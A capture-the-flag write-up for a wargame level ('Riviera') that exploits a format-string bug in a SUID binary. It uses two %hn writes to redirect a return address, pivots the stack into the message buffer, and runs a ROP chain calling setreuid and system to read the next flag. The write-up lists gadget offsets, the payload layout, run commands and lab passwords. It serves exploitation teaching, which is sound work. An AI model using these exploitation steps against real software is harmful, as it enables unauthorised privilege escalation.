# level04 — "Riviera" — Format String → Stack Pivot → ROP

## Concept

`./riviera`, SUID owned by `flag04`, home dir `/home/level04/`. First level
with NX enabled (no more shellcode-in-buffer, unlike level00–02). No
canary, no PIE, ASLR off system-wide. The vulnerability class is a classic
one-shot format string bug: user input is passed directly as a
`printf` format string with no format specifier of its own, giving both an
arbitrary-read and (via `%n`/`%hn`) an arbitrary-write primitive. Because
NX is on, the write primitive has to build a ROP chain rather than jump to
shellcode — and because the vulnerable buffer (`tag`) is only 31 usable
bytes, the ROP chain has to live somewhere else, reached via a stack pivot.

The technique class (format string → ROP) was identified quickly, but
turning it into a working exploit against the live binary took two
separate real bugs to track down: one in the exploit's own construction,
one a stale fact carried over from an earlier session.

## Recon

Login: `ssh level04@127.0.0.1 -p 4244`, password = level03's flag
(`8c33zqo7hytqnsx9h3nb4juf3rdjbd80`, previously verified).

```
$ ls -la ~
-rwsr-x--- 1 flag04  level04 16584 riviera
-r--r--r-- 1 level04 level04    38 README
```

`cat README` → "Riviera showed you what wasn't there." (flavor text, not a
mechanical hint.)

Source was already pulled to `riviera.c` (also present in this
`resources/` dir). Key structure:

```c
typedef struct {
    unsigned int seq, level;
    char tag[32];
    char message[256];
} log_entry_t;
static log_entry_t log_buf[8];
```

`handle_input()` reads `tag` (`fgets(tag,32,...)`) then `message`
(`fgets(msg,256,...)`), calls `log_message()` (copies both into the global
`log_buf[0]` via `strncpy`), then calls `display_entry(0)`. `main()` later
calls `flush_log()`, which calls `display_entry(0)` again (the same
entry — `log_seq` never exceeds 1 since `handle_input()` only runs once).

`display_entry()`:
```c
printf("[RIVIERA] [%u] tag=", log_buf[idx].seq);
printf(log_buf[idx].tag);              // <-- the bug: tag as format string, no args
printf(" msg=%s\n", log_buf[idx].message);
```

`checksec --file=./riviera`: Partial RELRO, no canary, NX enabled,
no PIE. `/proc/sys/kernel/randomize_va_space` = 0 (system-wide ASLR
off, confirmed later to be a deliberate lab setting via
`/etc/sysctl.d/99-rainfall.conf`). `ldd ./riviera` → libc base always
`0x7ffff7c00000`.

## Retrieving the addresses, command by command

`objdump -d display_entry` plus `nm` locate the global `log_buf` array at
the fixed address `0x404080`, and show that `display_entry`'s own
return-address slot sits exactly 8 bytes before `message`'s address.

Sending distinct 8-byte marker blocks as `message` and reading them back
through `tag = "%N$p"` for various `N` shows argument index 10 maps to
`message` byte offset 0, linearly (`arg N` → byte `(N-10)*8`), confirmed
against the real, live, non-gdb binary. That mapping holds at least
through index 34 but breaks somewhere before index 40 — a limit that
turned out to be specific to this compiled binary rather than a fixed
glibc rule, so it has to be checked directly against the target rather
than assumed to transfer. The final write-target indices used are 33 and
34 (`message` offset 184/192), safely inside the verified range.

The two-`%hn` write mechanism itself (two 16-bit writes covering a 32-bit
target) was confirmed in isolation by redirecting `printf`'s GOT entry
(`0x404010`, via `objdump -R`) to a `one_gadget` and watching gdb report a
spawned `/usr/bin/dash` — proof the write primitive works independent of
any stack-address guessing.

Overwriting `retslot`'s low 32 bits (the upper 32 are already
`0x00000000`, matching riviera's own non-PIE address range, so a cheap
2×`%hn` write is enough) with the address of a plain `ret` inside
riviera's own `.init` (`0x40101a`, via
`objdump -d --start-address=0x40101a`) makes `display_entry`'s real `ret`
land on that `ret`, which pops `message[0:8]` as the next RIP — a full
stack pivot into the 255-byte, attacker-controlled `message` buffer.

The live value of `retslot` was the hardest thing to pin down: plain gdb
kept shifting depending on injected env vars and unrelated shell state
even with the obvious culprits stripped, and `ptrace_scope=1` blocks
attaching to an already-running sibling process outright. The address
that finally stuck came from compiling a throwaway copy of `riviera.c`
with one added line printing `__builtin_frame_address(0)`, run with the
exact invocation shape intended for the real attack (`env -i PATH=...
HOME=... PWD=/home/level04 ./riviera`, binary literally named `riviera`)
— this value is environment-dependent and has to be recalibrated per
session, not hardcoded.

Two further bugs surfaced once a live crash trace of the real,
non-gdb-spawned process became possible (via a `PR_SET_PTRACER_ANY`
wrapper plus a FIFO to block the target mid-read): this call path needs
**no** alignment-fixup `ret` before `system` — the opposite parity from
level03 — and `getent passwd flag04` gives flag04's real uid as **1021**,
not the stale 1020 an earlier session's notes had carried over. That
stale uid had been silently failing `setreuid`'s permission check the
whole time and looked exactly like a stack-pivot addressing bug until
caught.

## Why a stack pivot into `message`, not a simpler GOT overwrite

A one-shot GOT overwrite to a `one_gadget` was tried and confirmed
mechanically working (see above), but the spawned shell always resets
back to level04's own uid on startup since `ruid != euid` at that point,
and none of riviera's three `printf` call sites offer `setreuid`-usable
register content directly — so some address-dependent, multi-gadget chain
was structurally unavoidable, landing on the stack-pivot-into-`message`
approach used below.

## Exploit

Final working chain (see `exploit.py` for the generator):

```
tag = "%{delta0}c%33$hn%{delta1}c%34$hn"   # two 16-bit writes, retslot's low 32 bits -> 0x40101a

message[0:72]   ROP chain:
  0:8    pop rdi ; ret            (libc +0x10f78b)
  8:16   1021                     (flag04's real uid)
  16:24  pop rsi ; pop rbp ; ret  (libc +0x2b46b -- byte-overlapping gadget, see note in exploit.py)
  24:32  1021
  32:40  0                        (junk, popped into rbp)
  40:48  setreuid                 (libc +0x1270d0)   <- setreuid(1021,1021) fires here
  48:56  pop rdi ; ret
  56:64  cmd_addr                 (points at our own command string, message+72)
  64:72  system                   (libc +0x58750)     <- NO alignment-fixup ret needed here
message[72:...] "id;cat /home/flag04/.pass\0"
message[184:200] retslot, retslot+2   (the two %hn write targets, argument indices 33/34)
```

`retslot` was, for the verified session, `0x7fffffffeb88` — obtained by
compiling a throwaway copy of `riviera.c` with one line added to
`display_entry()` (`fprintf(stderr, "RBP=%p", __builtin_frame_address(0))`),
running it with the exact same invocation shape intended for the
attack (`env -i PATH=/usr/bin:/bin HOME=/home/level04 PWD=/home/level04
./riviera < probe.bin`, from `/home/level04`, binary literally named
`riviera`), and using `RBP + 8`. This value is environment-dependent
and must be recalibrated for any new session — it is not safe to
hardcode.

Full command sequence on the VM:

```
$ env -i PATH=/usr/bin:/bin HOME=/home/level04 PWD=/home/level04 \
    ./riviera < payload.bin
[... printf padding noise ...]
$ id
uid=1021(flag04) gid=1007(level04) groups=1007(level04),1001(levelgroup)
$ cat /home/flag04/.pass
x0w8xdgapz3tjopq2s11a27yro7krazm
```

Verified: this string works as level05's SSH password
(`ssh level05@127.0.0.1 -p 4244`).

